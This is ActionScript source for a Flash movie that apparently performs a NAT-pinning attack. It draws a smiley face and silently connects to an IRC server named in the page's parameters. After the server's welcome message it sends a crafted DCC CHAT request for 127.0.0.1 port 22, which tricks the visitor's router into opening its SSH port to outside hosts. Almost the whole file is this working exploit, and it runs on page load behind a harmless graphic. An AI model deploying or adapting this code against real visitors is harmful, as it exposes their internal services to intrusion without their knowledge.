package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	
	public class Main extends MovieClip {
		static var socket:Socket
		var sServer:String
		var sType:String
		var iCallbackPort:int
		var sCallbackIP:String

      		function Main() {
		         this.graphics.beginFill(0xcccc00)
		         this.graphics.drawCircle(200,200,200)
		         this.graphics.endFill()
		         this.graphics.beginFill(0x000000)
		         this.graphics.drawCircle(140,150,50)
		         this.graphics.drawCircle(260,150,50)
		         this.graphics.drawRoundRect(140,270,120,10,20)
		         this.graphics.endFill()
			//Security.loadPolicyFile("xmlsocket://62.213.198.42:6667");
			//Security.allowDomain("62.213.198.42");
			socket = new Socket();

			socket.addEventListener(Event.CONNECT, onConnect);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponse);
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);


			//get external vars
			sServer= root.loaderInfo.parameters.server as String;
			sType= root.loaderInfo.parameters.type as String;
			iCallbackPort = root.loaderInfo.parameters.cp as int;
			sCallbackIP = root.loaderInfo.parameters.ci as String;

			switch (sType.toUpperCase()){
				case "IRC":
					socket.connect(sServer, 6667);
				case "FTP":
					socket.connect(sServer, 21);
				default:
					trace("Invalid protocol specified in type argument, try 'IRC' or 'FTP'.")
			}
			
		}
		function onConnect(e:Event):void {
			socket.writeUTFBytes("NICK natpin\n");
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			trace("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			trace("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				if (socket.readUTFBytes(socket.bytesAvailable).indexOf("376")>0){
					socket.writeUTFBytes("PRIVMSG raf :\1DCC CHAT chat 2130706433 22\1\n")
				}
			}
		}
	}
}
